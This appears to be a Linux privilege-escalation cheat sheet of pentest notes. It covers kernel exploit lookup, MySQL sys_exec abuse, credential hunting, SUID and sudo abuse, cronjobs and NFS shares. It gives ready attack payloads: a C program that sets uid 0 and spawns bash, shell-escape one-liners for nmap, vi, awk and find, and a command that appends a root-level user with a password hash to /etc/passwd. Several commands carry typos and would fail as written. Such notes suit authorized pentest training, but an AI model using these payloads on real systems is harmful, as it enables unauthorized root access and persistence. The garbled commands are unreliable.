
# Kernel exploits
Kernel exploit can crash your machine and put it into a unstable state 
Kernal exploits should be the last resort.

Check the following OS and Architecture 
Uname –a 
Cat /proc/verison
Cat /etc/issue

Search for exploits 
exploit-db : Kernal verison 
 Linprivchecker.py tool 
  
  
### Programs running as root
  
The idea here is that if a specific service is running as root and you can make that service execute commands you can execute command as root. Look for whatever database, or anything else like that

# Check which processes are running 

Metasploit 
PS

 Linux 
ps aux | grep root


Ps aux 
In Linux the command :ps-aux means show al processes for all users. 


Mysql 
If you see that mysql is running as root and you have credentials to access the database then you can abuse the following commands
	• Select sys_exec('whoami')
	• Select sys_exec('whoami')

Further information about abusing mysql user 
https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/

http://dillidba.blogspot.com/2016/01/get-root-shell-access-using-mysql-with.html
  
# Installed software


Tuesday, September 10, 2019
11:06 AM

Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.

Common location for user installed software 
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src

debian
Dpkg –l 

CentOS. OpenSuse, Fedora, RHEL
Rpm –qa (centOS/ openSUSE)

openBSD, FreeBSD
Pkg_info 

 
# Weak/reused/plaintext passwords

	• Check file where webserver connect to database(Config.php or similar)
	• Check databse for admin paswords that might be used 
	• Check weak passwords


Common credentials
	• Username
	• Username1 
	• Root
	• Admin
	• Qwerty
	• Password

Check plaintext password
Anything interesting in mail
/var/spool/mail


Search for passwords 
./LinEnum.sh -t –l password
  
# Inside service

It is important to check if users are running some services that are only available from that host. You can't connect from the service from the outside. It might be a development server, database, or anything else you don't seen on your scan from the other side.

These services might be running as root or have vulnerabilities in them. They might be even more vulnerable since developers or user might think " since it's only accessible internally this risk is mitigated. 

Check the netstat and compare it with the nmap scan. Do you find anymore services internally then on your nmap scan? 

Linux 
Netstat –anlp
Netstat –ano 
  
# Suid misconfiguration

Topics below 
	• Checking for password execution as root user
	• How to configure SUID
	• How to check if SUID is applied on a file or not 
	• How to find all File with applied SUID on it 

SUID files get executed with the privileges of the file owner 
SGID files get executed with the privileges of the file group 


List of programs with their shell escape sequences can be found at 
Gtfobins.github.io

Overview 
When a binary with SUID/GUID permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way we can abuse we could use that to escalate our privileges 

SUID and GUID Misconfiguration 
Programs that can spawn shell
	• Nmap 
	• Vim
	• Less
	• More 
Program have suid-bit set we can use them to escalate privileges too. See how you can abuse sudo –rights
	• Nano
	• CP
	• MV
	• Find 

Find SUID and GUID files 

Find SUID
find / -perm -u=s -type f 2>/dev/null

Find GUID
find / -perm -g=s -type f 2>/dev/null
 
 
 SUID – Special permissions 
SUID is used in Linux for providing elevated privileges temporarily during execution. This is elevation of privilege is not permeant at all. It's a temporary elevation on when the program or script is executed 

https://www.slashroot.in/suid-and-sgid-linux-explained-examples
Examples of Executable Files in Linux having SUID permission bit set
	-rwsr-xr-x 1 root root 34904 Mar 12  2014 /bin/su

-rwsr-xr-x 1 root root 40760 Sep 26  2013 /bin/ping

-rwsr-xr-x 1 root root 77336 Apr 28  2014 /bin/mount

-rwsr-xr-x 1 root root 53472 Apr 28  2014 /bin/umount

-rwsr-xr-x 1 root root 66352 Dec  7  2011 /usr/bin/chage

-rwsr-xr-x 1 root root 30768 Feb 22  2012 /usr/bin/passwd

---s--x--x 1 root root 123832 Nov 22  2013 /usr/bin/sudo

-rwsr-xr-x 1 root root 51784 Nov 23  2013 /usr/bin/crontab



![image](https://user-images.githubusercontent.com/57737355/90061937-b866ae00-dc9b-11ea-81f7-ede03c947461.png)
![image](https://user-images.githubusercontent.com/57737355/90061994-d3d1b900-dc9b-11ea-8eb2-f6ad03041695.png)
![image](https://user-images.githubusercontent.com/57737355/90062016-da603080-dc9b-11ea-8a40-06ba7925048c.png)
![image](https://user-images.githubusercontent.com/57737355/90062053-ed730080-dc9b-11ea-9379-a24208eda942.png)
![image](https://user-images.githubusercontent.com/57737355/90062081-fa8fef80-dc9b-11ea-84ff-85b6d37d220a.png)
 
  
# Abusing sudo-rights
If you have a limited shell that has access to some program using SUDO you might be able to escalate privileges with. Any program that can write or overwrite can be used. For example if you have sudo-right to CP you can overwrite /etc/shadow or /etc/sudoers with your own malicious files 

**Resources**
> https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/
> https://touhidshaikh.com/blog/?p=790
> https://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/
> https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/

![image](https://user-images.githubusercontent.com/57737355/90062386-768a3780-dc9c-11ea-94c5-88b21bd0103a.png)

# World writable scripts invoked by root

If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.


#World writable files directories

find / -writable -type d 2>/dev/null

find / -perm -222 -type d 2>/dev/null

find / -perm -o w -type d 2>/dev/null


# World executable folder

find / -perm -o x -type d 2>/dev/null


# World writable and executable folders

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

World writable directories
/tmp

/var/tmp

/dev/shm

/var/spool/vbox

/var/spool/samba

  
# Bad path configuration
  
  Putting . in the path
If you put a dot in your path you won't have to write ./binary to be able to execute it. You will be able to execute any script or binary that is in the current directory.
Why do people/sysadmins do this? Because they are lazy and won't want to write ./.
This explains it
https://hackmag.com/security/reach-the-root/
And here
http://www.dankalia.com/tutor/01005/0100501004.htm

  
# Cronjobs

Cronjob
With privileges running script that are editable for other users.
+
Look for anything that is owned by privileged user but writable for you:
crontab -l

ls -alh /var/spool/cron

ls -al /etc/ | grep cron

ls -al /etc/cron*

cat /etc/cron*

cat /etc/at.allow

cat /etc/at.deny

cat /etc/cron.allow

cat /etc/cron.deny

cat /etc/crontab

cat /etc/anacrontab

cat /var/spool/cron/crontabs/root
  
  
Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
mount -l
cat /etc/fstab

NFS Share
If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/


If that succeeds then you can go to /tmp/share. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.

If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.

This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:
+
chmod 4777 exploit
#include <stdio.h>

#include <stdlib.h>
#include <sys/types.h>

#include <unistd.h>


```c
	int main()

		{

		    setuid(0);
    
		  system("/bin/bash");

		    return 0;

		}
```

# Shell Escape Techniques
Nmap
Nmap --interactive

vi
!bash 
Set shell=/bin/bash:shell

Awk
Awk'BEGIN {system("/bin/bash")}'\;

Find 
Find / -exec /usr/bin/awk 'BEGIN {sytem("/bin/bash")}'\;

pearl
Pearl –e 'exec "/bin/bash";'

# Adding user to /etc/passwd 
echo "firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash" >> /etc/passwd
